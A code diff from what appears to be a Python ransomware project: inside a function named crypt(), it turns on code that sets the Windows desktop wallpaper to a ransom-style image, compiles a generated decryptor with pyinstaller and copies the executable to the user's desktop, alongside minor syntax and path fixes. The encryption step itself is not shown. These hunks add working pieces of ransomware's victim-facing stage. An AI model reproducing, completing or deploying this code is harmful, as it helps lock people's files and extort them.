@@ -27,7 +27,7 @@ from time import sleep
 
 def progessbar_loop():
     global i, root
-    progressbar['value'] = i*10;
+    progressbar['value'] = i*10
     i+=1
     if(i == 11):
         i=0
@@ -114,19 +114,17 @@ def crypt():
     # ############################ 6- show encryption screen ################################
 
 
-    # define constants
-    # SPI_SETDESKWALLPAPER = 20
-    # SPIF_UPDATEINIFILE = 0x01
-    # SPIF_SENDWININICHANGE = 0x02
+    import ctypes
 
-    # # set the path to your desired image file
-    # image_path = r"C:\\Users\\win10\\Desktop\\pythonProject\\image.png"
+    SPI_SETDESKWALLPAPER = 20
 
-    # # call the SystemParametersInfo function to set the desktop wallpaper
-    # ctypes.windll.user32.SystemParametersInfoW(
-    #     SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
+    # Replace 'path/to/image.jpg' with the path of the image you want to use
+    image_path = r'C:\Users\belha\Desktop\crypto_project\image.png'
 
+    # Call the Win32 API function to set the desktop background
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path , 0)
 
+    input("image set")
     # ############################ 7- create decryptor program ################################
     import subprocess
 
@@ -135,7 +133,7 @@ import os
 import sys
 
 # adding Folder_2 to the system path
-sys.path.insert(0, 'C:\\\\Users\\\\win10\\\\Desktop\\\\pythonProject')
+sys.path.insert(0, 'C:\\\\Users\\\\belha\\\\Desktop\\\\crypto_project')
 
 import win32api
 from datetime import datetime
@@ -214,7 +212,18 @@ decrypt()
     with open(program_path, 'w') as f:
         f.write(program_code)
 
-    subprocess.run(f"pyinstaller {program_name} --onefile")
+    subprocess.run(f"pyinstaller --onefile {program_name}")
+
+    import shutil
+
+    # Get the path of the user's desktop directory
+    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
+
+    # Replace 'my_app.exe' with the name of your executable file
+    executable_path = './dist/decryptor.exe'
+
+    # Copy the executable file to the desktop directory
+    shutil.copy2(executable_path, desktop_path)
 
     os.remove(program_path)
 
